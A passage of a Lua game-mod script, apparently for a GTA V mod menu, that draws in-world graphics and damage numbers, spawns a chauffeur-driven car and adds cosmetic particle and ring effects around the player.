            pos.z + length, colour_b.r, colour_b.g, colour_b.b, colour_b.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * 0), pos.y + (angle_sin * 0 + angle_cos * 0), pos.z + 0,
            pos.x + (angle_cos * 0 - angle_sin * -height), pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height, pos.x + (angle_cos * -width - angle_sin * 0),
            pos.y + (angle_sin * -width + angle_cos * 0), pos.z + length, colour_a.r, colour_a.g, colour_a.b, colour_a.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * height), pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height, pos.x + (angle_cos * 0 - angle_sin * 0), pos.y + (angle_sin * 0 + angle_cos * 0),
            pos.z + 0, pos.x + (angle_cos * -width - angle_sin * 0), pos.y + (angle_sin * -width + angle_cos * 0),
            pos.z + length, colour_a.r, colour_a.g, colour_a.b, colour_a.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * height), pos.y + (angle_sin * 0 + angle_cos * height),
            pos.z + length + height, pos.x + (angle_cos * 0 - angle_sin * -height),
            pos.y + (angle_sin * 0 + angle_cos * -height), pos.z + length + height,
            pos.x + (angle_cos * width - angle_sin * 0), pos.y + (angle_sin * width + angle_cos * 0), pos.z + length,
            colour_b.r, colour_b.g, colour_b.b, colour_b.a)
        GRAPHICS.DRAW_POLY(pos.x + (angle_cos * 0 - angle_sin * -height), pos.y + (angle_sin * 0 + angle_cos * -height),
            pos.z + length + height, pos.x + (angle_cos * 0 - angle_sin * height),
            pos.y + (angle_sin * 0 + angle_cos * height), pos.z + length + height,
            pos.x + (angle_cos * -width - angle_sin * 0), pos.y + (angle_sin * -width + angle_cos * 0), pos.z + length,
            colour_a.r, colour_a.g, colour_a.b, colour_a.a)
    end
    self.draw_quad = function(pos1_org, pos2_org, size, colour_a, colour_b, dict, texture)
        GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dict, false)
        if GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dict) then
            pos1 = {
                x = pos1_org.x,
                y = pos1_org.y,
                z = pos1_org.z
            }
            pos2 = {
                x = pos2_org.x,
                y = pos2_org.y,
                z = pos2_org.z
            }
            pos2.z = pos2.z - size * 0.5
            pos1.z = pos1.z - size * 0.5
            GRAPHICS.SET_BACKFACECULLING(false)
            GRAPHICS._DRAW_SPRITE_POLY_2(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, pos2.x, pos2.y, pos2.z + size,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a, colour_b.r, colour_b.g, colour_b.b, colour_b.a,
                colour_b.r, colour_b.g, colour_b.b, colour_b.a, dict, texture, 0, 1, 0, 1, 1, 0, 0, 0, 0)
            GRAPHICS._DRAW_SPRITE_POLY_2(pos1.x, pos1.y, pos1.z + size, pos1.x, pos1.y, pos1.z, pos2.x, pos2.y,
                pos2.z + size, colour_a.r, colour_a.g, colour_a.b, colour_a.a, colour_a.r, colour_a.g, colour_a.b,
                colour_a.a, colour_a.r, colour_a.g, colour_a.b, colour_a.a, dict, texture, 0, 0, 0, 1, 1, 0, 1, 0, 0)
        else
            notification("not loaded")
        end
    end
    self.arc_line = {}
    self.arc_line.new = function()
        arc = {}
        arc.instability = 0.75
        arc.draw = function(pos1, pos2)
            local dif = {
                x = pos2.x - pos1.x,
                y = pos2.y - pos1.y,
                z = pos2.z - pos1.z
            }
            local distance_to_cover = math.sqrt((dif.x * dif.x) + (dif.y * dif.y) + (dif.z * dif.z))
            local nor_dir = {
                x = dif.x / distance_to_cover,
                y = dif.y / distance_to_cover,
                z = dif.z / distance_to_cover
            }
            for _ = 0, 3, 1 do
                local distance_covered = math.random() * 1.5
                local previous_pos = pos1
                repeat
                    local current_pos = {
                        x = pos1.x + nor_dir.x * distance_covered + (math.random() - 0.5) * arc.instability,
                        y = pos1.y + nor_dir.y * distance_covered + (math.random() - 0.5) * arc.instability,
                        z = pos1.z + nor_dir.z * distance_covered + (math.random() - 0.5) * arc.instability
                    }
                    GRAPHICS.DRAW_LINE(previous_pos.x, previous_pos.y, previous_pos.z, current_pos.x, current_pos.y,
                        current_pos.z, 0, 255, 255, 255)
                    previous_pos = current_pos
                    distance_covered = distance_covered + math.random() * 1.5
                until distance_covered > distance_to_cover
                GRAPHICS.DRAW_LINE(previous_pos.x, previous_pos.y, previous_pos.z, pos2.x, pos2.y, pos2.z, 0, 255, 255,
                    255)
            end
            arc.instability = arc.instability + (0.15 - arc.instability) * MISC.GET_FRAME_TIME() * 7
        end
        return arc
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    local upVector_pointer = memory.alloc()
    local rightVector_pointer = memory.alloc()
    local forwardVector_pointer = memory.alloc()
    local position_pointer = memory.alloc()
    self.draw_bounding_box = function(entity, colour)
        ENTITY.GET_ENTITY_MATRIX(entity, rightVector_pointer, forwardVector_pointer, upVector_pointer, position_pointer);
        local forward_vector = memory.read_vector3(forwardVector_pointer)
        local right_vector = memory.read_vector3(rightVector_pointer)
        local up_vector = memory.read_vector3(upVector_pointer)
        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local minimum_vec = memory.read_vector3(minimum)
        local maximum_vec = memory.read_vector3(maximum)
        local dimensions = {
            x = maximum_vec.y - minimum_vec.y,
            y = maximum_vec.x - minimum_vec.x,
            z = maximum_vec.z - minimum_vec.z
        }
        local top_right = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, maximum_vec.x, maximum_vec.y,
            maximum_vec.z)
        local top_right_back = {
            x = forward_vector.x * -dimensions.y + top_right.x,
            y = forward_vector.y * -dimensions.y + top_right.y,
            z = forward_vector.z * -dimensions.y + top_right.z
        }
        local bottom_right_back = {
            x = up_vector.x * -dimensions.z + top_right_back.x,
            y = up_vector.y * -dimensions.z + top_right_back.y,
            z = up_vector.z * -dimensions.z + top_right_back.z
        }
        local bottom_left_back = {
            x = -right_vector.x * dimensions.x + bottom_right_back.x,
            y = -right_vector.y * dimensions.x + bottom_right_back.y,
            z = -right_vector.z * dimensions.x + bottom_right_back.z
        }
        local top_left = {
            x = -right_vector.x * dimensions.x + top_right.x,
            y = -right_vector.y * dimensions.x + top_right.y,
            z = -right_vector.z * dimensions.x + top_right.z
        }
        local bottom_right = {
            x = -up_vector.x * dimensions.z + top_right.x,
            y = -up_vector.y * dimensions.z + top_right.y,
            z = -up_vector.z * dimensions.z + top_right.z
        }
        local bottom_left = {
            x = forward_vector.x * dimensions.y + bottom_left_back.x,
            y = forward_vector.y * dimensions.y + bottom_left_back.y,
            z = forward_vector.z * dimensions.y + bottom_left_back.z
        }
        local top_left_back = {
            x = up_vector.x * dimensions.z + bottom_left_back.x,
            y = up_vector.y * dimensions.z + bottom_left_back.y,
            z = up_vector.z * dimensions.z + bottom_left_back.z
        }
        GRAPHICS.DRAW_LINE(top_right.x, top_right.y, top_right.z, top_right_back.x, top_right_back.y, top_right_back.z,
            colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(top_right.x, top_right.y, top_right.z, top_left.x, top_left.y, top_left.z, colour.r,
            colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(top_right.x, top_right.y, top_right.z, bottom_right.x, bottom_right.y, bottom_right.z,
            colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(bottom_left_back.x, bottom_left_back.y, bottom_left_back.z, bottom_right_back.x,
            bottom_right_back.y, bottom_right_back.z, colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(bottom_left_back.x, bottom_left_back.y, bottom_left_back.z, bottom_left.x, bottom_left.y,
            bottom_left.z, colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(bottom_left_back.x, bottom_left_back.y, bottom_left_back.z, top_left_back.x, top_left_back.y,
            top_left_back.z, colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(top_left_back.x, top_left_back.y, top_left_back.z, top_right_back.x, top_right_back.y,
            top_right_back.z, colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(top_left_back.x, top_left_back.y, top_left_back.z, top_left.x, top_left.y, top_left.z,
            colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(bottom_right_back.x, bottom_right_back.y, bottom_right_back.z, top_right_back.x,
            top_right_back.y, top_right_back.z, colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(bottom_left.x, bottom_left.y, bottom_left.z, top_left.x, top_left.y, top_left.z, colour.r,
            colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(bottom_left.x, bottom_left.y, bottom_left.z, bottom_right.x, bottom_right.y, bottom_right.z,
            colour.r, colour.g, colour.b, colour.a)
        GRAPHICS.DRAW_LINE(bottom_right_back.x, bottom_right_back.y, bottom_right_back.z, bottom_right.x,
            bottom_right.y, bottom_right.z, colour.r, colour.g, colour.b, colour.a)
    end
    local numbers = {}
    local x_coord_ptr = memory.alloc(4)
    local y_coord_ptr = memory.alloc(4)
    local draw_numbers = function()
        util.create_tick_handler(function()
            local delta_time = MISC.GET_FRAME_TIME()
            for i, number in ipairs(numbers) do
                if GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(number.pos.x, number.pos.y, number.pos.z, x_coord_ptr,
                    y_coord_ptr) then
                    local x = memory.read_float(x_coord_ptr)
                    local y = memory.read_float(y_coord_ptr)
                    local alpha = math.min(1, number.time)
                    directx.draw_text(x, y, number.num, ALIGN_CENTRE, number.size, {
                        r = number.colour.r * alpha,
                        g = number.colour.g * alpha,
                        b = number.colour.b * alpha,
                        a = number.colour.a * alpha
                    }, false)
                    number.pos.z = number.pos.z + 0.2 * delta_time
                end
                number.time = number.time - delta_time
                if number.time < 0 then
                    table.remove(numbers, i)
                end
            end
            return #numbers ~= 0
        end)
    end
    local random_offset = 1
    self.draw_damage_number = function(entity, num, colour, size)
        pos = ENTITY.GET_ENTITY_COORDS(entity)
        random_offset_pos = {
            x = pos.x + (math.random() * random_offset - random_offset * 0.5),
            y = pos.y + (math.random() * random_offset - random_offset * 0.5),
            z = pos.z
        }
        numbers[#numbers + 1] = {
            pos = random_offset_pos,
            colour = colour,
            num = num,
            size = size,
            time = 3
        }
        if #numbers == 1 then
            draw_numbers()
        end
    end
    -- all credit to Nowiry#2663 for this one
    self.draw_button_tip = function(buttons, duration, colour)
        function equals(l1, l2)
            if l1 == l2 then
                return true
            end
            local type1 = type(l1)
            local type2 = type(l2)
            if type1 ~= type2 then
                return false
            end
            if type1 ~= 'table' then
                return false
            end
            for k, v in pairs(l1) do
                if not l2[k] or not equals(v, l2[k]) then
                    return false
                end
            end
            return true
        end
        local timer = 0
        util.create_tick_handler(function()
            local INSTRUCTIONAL = {}
            INSTRUCTIONAL.scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE('instructional_buttons')
            INSTRUCTIONAL.isKeyboard = PAD._IS_USING_KEYBOARD(2)
            if not equals(buttons, INSTRUCTIONAL.currentsettup) or INSTRUCTIONAL.isKeyboard ~= PAD._IS_USING_KEYBOARD(2) then
                local colour = colour or {
                    ['r'] = 0,
                    ['g'] = 0,
                    ['b'] = 0
                }
                while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(INSTRUCTIONAL.scaleform) do
                    wait()
                end
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'CLEAR_ALL')
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'TOGGLE_MOUSE_BUTTONS')
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(true)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                for i = 1, #buttons do
                    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'SET_DATA_SLOT')
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(i) -- position
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(
                        PAD.GET_CONTROL_INSTRUCTIONAL_BUTTON(2, buttons[i][2], true)) -- control
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(buttons[i][1]) -- name
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_BOOL(buttons[i][3] or false) -- clickable
                    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(buttons[i][2]) -- what control will be pressed when you click the button
                    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                end
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'SET_BACKGROUND_COLOUR')
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.r)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.g)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(colour.b)
                GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(80)
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(INSTRUCTIONAL.scaleform, 'DRAW_INSTRUCTIONAL_BUTTONS')
                GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
                INSTRUCTIONAL.currentsettup = buttons
                INSTRUCTIONAL.isKeyboard = PAD._IS_USING_KEYBOARD(2)
            end
            GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(INSTRUCTIONAL.scaleform, 255, 255, 255, 255, 0)
            if timer > duration then
                return false
            end
            timer = timer + MISC.GET_FRAME_TIME()
            return true
        end)
    end
    return self
end
b_colour = {}
b_colour.new = function()
    local self = {}
    self.new = function(r, g, b, a)
        return {
            r = r,
            g = g,
            b = b,
            a = a
        }
    end
    self.white = {
        r = 255,
        g = 255,
        b = 255,
        a = 255
    }
    self.black = {
        r = 0,
        g = 0,
        b = 0,
        a = 255
    }
    self.magenta = {
        r = 255,
        g = 0,
        b = 255,
        a = 255
    }
    self.red = {
        r = 255,
        g = 0,
        b = 0,
        a = 255
    }
    self.green = {
        r = 0,
        g = 255,
        b = 0,
        a = 255
    }
    self.blue = {
        r = 0,
        g = 0,
        b = 255,
        a = 255
    }
    self.to_rage = function(colour)
        return {
            r = math.floor(colour.r * 255),
            g = math.floor(colour.g * 255),
            b = math.floor(colour.b * 255),
            a = math.floor(colour.a * 255)
        }
    end
    self.to_stand = function(colour)
        return {
            r = colour.r / 255,
            g = colour.g / 255,
            b = colour.b / 255,
            a = colour.a / 255
        }
    end
    return self
end
colour = b_colour.new()
drawing_funcs = b_drawing_funcs.new()
damage_numbers_target_ptr = memory.alloc(4)
damage_numbers_tracked_entities = {}
damage_numbers_health_colour = colour.to_stand(colour.new(20, 180, 50, 255))
damage_numbers_armour_colour = colour.to_stand(colour.new(50, 50, 200, 255))
damage_numbers_crit_colour = colour.to_stand(colour.new(200, 200, 10, 255))
damage_numbers_vehicle_colour = colour.to_stand(colour.new(200, 100, 20, 255))
damage_numbers_bone_ptr = memory.alloc(4)
damage_numbers_text_size = 0.700000
damage_numbers_target_vehicles = damage_numbers_text_size
function damage_numbers()
    if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(players.user(), damage_numbers_target_ptr) then
        local target = memory.read_int(damage_numbers_target_ptr)
        if ENTITY.IS_ENTITY_A_PED(target) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(target, false)
            if vehicle ~= 0 and damage_numbers_target_vehicles then
                if damage_numbers_tracked_entities[vehicle] == nil then
                    damage_numbers_tracked_entities[vehicle] = {
                        health = math.max(0, ENTITY.GET_ENTITY_HEALTH(vehicle)),
                        timer = 1
                    }
                else
                    damage_numbers_tracked_entities[vehicle].timer = 1
                end
            end
            if damage_numbers_tracked_entities[target] == nil then
                damage_numbers_tracked_entities[target] = {
                    health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target) - 100),
                    armour = PED.GET_PED_ARMOUR(target),
                    timer = 1
                }
            else
                damage_numbers_tracked_entities[target].timer = 1
            end
        elseif ENTITY.IS_ENTITY_A_VEHICLE(target) and damage_numbers_target_vehicles then
            if damage_numbers_tracked_entities[target] == nil then
                damage_numbers_tracked_entities[target] = {
                    health = math.max(0, ENTITY.GET_ENTITY_HEALTH(target)),
                    timer = 1
                }
            else
                damage_numbers_tracked_entities[target].timer = 1
            end
        end
    end
    for entity, data in pairs(damage_numbers_tracked_entities) do
        if ENTITY.IS_ENTITY_A_PED(entity) then
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity) - 100)
            local current_armour = PED.GET_PED_ARMOUR(entity)
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, PLAYER.PLAYER_PED_ID(), 1) then
                if current_health < data.health then
                    data.timer = 1
                    PED.GET_PED_LAST_DAMAGE_BONE(entity, damage_numbers_bone_ptr)
                    if memory.read_int(damage_numbers_bone_ptr) == 31086 then
                        drawing_funcs.draw_damage_number(entity, data.health - current_health,
                            damage_numbers_crit_colour, damage_numbers_text_size)
                    else
                        drawing_funcs.draw_damage_number(entity, data.health - current_health,
                            damage_numbers_health_colour, damage_numbers_text_size)
                    end
                end
                if current_armour < data.armour then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.armour - current_armour, damage_numbers_armour_colour,
                        damage_numbers_text_size)
                end
            end
            data.timer = data.timer - MISC.GET_FRAME_TIME()
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
            data.armour = current_armour
        else
            local current_health = math.max(0, ENTITY.GET_ENTITY_HEALTH(entity))
            if ENTITY.HAS_ENTITY_BEEN_DAMAGED_BY_ENTITY(entity, PLAYER.PLAYER_PED_ID(), 1) then
                if current_health < data.health then
                    data.timer = 1
                    drawing_funcs.draw_damage_number(entity, data.health - current_health,
                        damage_numbers_vehicle_colour, damage_numbers_text_size)
                end
            end
            data.timer = data.timer - MISC.GET_FRAME_TIME()
            if data.timer < 0 then
                damage_numbers_tracked_entities[entity] = nil
            end
            data.health = current_health
        end
    end
end
function Vspawn(mod, pCoor, pedSi, plate)
    Streament(mod)
   local vmod = VEHICLE.CREATE_VEHICLE(mod, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
    PED.SET_PED_INTO_VEHICLE(pedSi, vmod, -1)
    VEHICLE.SET_VEHICLE_COLOURS(vmod, math.random(0, 160), math.random(0, 160))
    Vmod(vmod, plate)
    local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
    ENTITY.SET_ENTITY_HEADING(vmod, CV)
end
local taxi_ped = 0
local taxi_veh = 0
local taxi_blip = -1
function summ_car(index, value)
    local vhash = util.joaat(value)
    local phash = util.joaat("s_m_y_casino_01")
    if taxi_veh ~= 0 then
        entities.delete_by_handle(taxi_veh)
    end
    if taxi_ped ~= 0 then
        util.remove_blip(taxi_blip)
        entities.delete_by_handle(taxi_ped)
    end 
    local plyr = players.user_ped()
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 5.0, 0.0)
    request_model_load(vhash)
    request_model_load(phash)
    taxi_veh = entities.create_vehicle(vhash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
    max_out_car(taxi_veh)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(taxi_veh, "LANCE")
    VEHICLE.SET_VEHICLE_COLOURS(taxi_veh, 145, 145)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_veh, true)
    --local my_rel_hash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(players.user_ped())
    taxi_ped = entities.create_ped(32, phash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(taxi_ped, util.joaat("rgFM_AiLike"))
    taxi_blip = HUD.ADD_BLIP_FOR_ENTITY(taxi_ped)
    HUD.SET_BLIP_COLOUR(taxi_blip, 7)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_ped, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(taxi_ped, true)
    PED.SET_PED_FLEE_ATTRIBUTES(taxi_ped, 0, false)
    PED.SET_PED_CAN_BE_DRAGGED_OUT(taxi_ped, false)
    VEHICLE.SET_VEHICLE_EXCLUSIVE_DRIVER(taxi_veh, taxi_ped, -1)
    PED.SET_PED_INTO_VEHICLE(taxi_ped, taxi_veh, -1)
    ENTITY.SET_ENTITY_INVINCIBLE(taxi_ped, true)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), taxi_veh, 0)
    notification("您的司机已创建！", colors.blue)
end
function summ_car_topoint()
    if taxi_ped == 0 then
        notification("你没有生成司机.")
    else
        local goto_coords = get_waypoint_coords()
        if goto_coords ~= nil then
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(taxi_ped, taxi_veh, goto_coords['x'], goto_coords['y'], goto_coords['z'], 300.0, 786996, 5)
        end
    end
end
function summ_car_tp()
    if taxi_ped == 0 then
        notification("你没有生成司机.", colors.blue)
    else
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), taxi_veh, 0)
    end
end
function summ_car_bmob()
    if taxi_ped == 0 then
        notification("你没有生成司机.", colors.blue)
    else
        local ped_copy = taxi_ped
        local veh_copy = taxi_veh
        taxi_ped = 0
        taxi_veh = 0
        local coords = ENTITY.GET_ENTITY_COORDS(veh_copy)
        ENTITY.SET_ENTITY_INVINCIBLE(veh_copy, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 100.0, true, false, 1.0)
        ENTITY.SET_ENTITY_HEALTH(veh_copy, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(ped_copy, false)
        ENTITY.SET_ENTITY_HEALTH(ped_copy, 0)
        if math.random(5) == 3 then
            notification("他有老婆孩子...", colors.blue)
        end
        wait(3000)
        entities.delete_by_handle(ped_copy)
        entities.delete_by_handle(veh_copy)
    end
end
local careffects = {
	{"scr_rcbarry1", "scr_alien_impact_bul", 1.0, 50},
	{"scr_rcbarry2", "scr_clown_appears", 0.3, 500},
	{"core", "ent_dst_elec_fire_sp", 1.0, 100},
	{"scr_rcbarry1", "scr_alien_disintegrate", 0.1, 400},
	{"scr_rcbarry1", "scr_alien_teleport", 0.1, 400}
}
local careffects_lastEffect = newTimer()
function cargoodeffect()
    local effects = careffects[selectedOpt]
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
	if ENTITY.DOES_ENTITY_EXIST(vehicle) and not ENTITY.IS_ENTITY_DEAD(vehicle, false) and
	VEHICLE.IS_VEHICLE_DRIVEABLE(vehicle, false) and careffects_lastEffect.elapsed() > effects[4] then
		request_fx_asset(effects[1])
		for _, boneName in pairs({"wheel_lf", "wheel_lr", "wheel_rf", "wheel_rr"}) do
			local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicle, boneName)
			GRAPHICS.USE_PARTICLE_FX_ASSET(effects[1])
			GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
				effects[2],
				vehicle,
				-0.05, 0.0, 0.0,
				0.0, 0.0, 0.0,
				bone,
				effects[3],
				false, false, false
			)
		end
		careffects_lastEffect.reset()
	end
end
function set_carvis(index)
    selectedOpt = index
end
-- 封号斗罗
function kongzhihk(toggle)
    local radius = 0.3
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.97, c.x + x2, c.y + y2, c.z - 0.95, 255, 255, 255, 255)
    end
end
function kongzhiha(toggle)
    local radius = 0.31
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.97, c.x + x2, c.y + y2, c.z - 0.97, 255, 255, 255, 255)
    end
end
function kongzhihb(toggle)
    local radius = 0.32
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.97, c.x + x2, c.y + y2, c.z - 0.97, 255, 255, 255, 255)
    end
end
function kongzhihc(toggle)
    local radius = 0.33
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.97, c.x + x2, c.y + y2, c.z - 0.97, 255, 255, 255, 255)
    end
end
function kongzhihd(toggle)
    local radius = 0.34
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.97, c.x + x2, c.y + y2, c.z - 0.97, 255, 255, 255, 255)
    end
end
function hunhuan(toggle)
    kongzhihk()
    kongzhiha()
    kongzhihb()
    kongzhihc()
    kongzhihd()
end
function kongzhikk(toggle)
    local radius = 0.5
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.95, c.x + x2, c.y + y2, c.z - 0.95, 255, 255, 0, 255)
    end
end
function kongzhika(toggle)
    local radius = 0.51
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.95, c.x + x2, c.y + y2, c.z - 0.95, 255, 255, 0, 255)
    end
end
function kongzhikb(toggle)
    local radius = 0.52
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.95, c.x + x2, c.y + y2, c.z - 0.95, 255, 255, 0, 255)
    end
end
function kongzhikc(toggle)
    local radius = 0.53
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
        GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1, c.z - 0.95, c.x + x2, c.y + y2, c.z - 0.95, 255, 255, 0, 255)
    end
end
function kongzhikd(toggle)
    local radius = 0.54
    local numSegments = 100
    local segmentAngle = 360 / numSegments
    local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    for i = 1, numSegments do
        local angle1 = math.rad((i - 1) * segmentAngle)
        local angle2 = math.rad(i * segmentAngle)
        local x1 = radius * math.cos(angle1)
        local y1 = radius * math.sin(angle1)
        local x2 = radius * math.cos(angle2)
        local y2 = radius * math.sin(angle2)
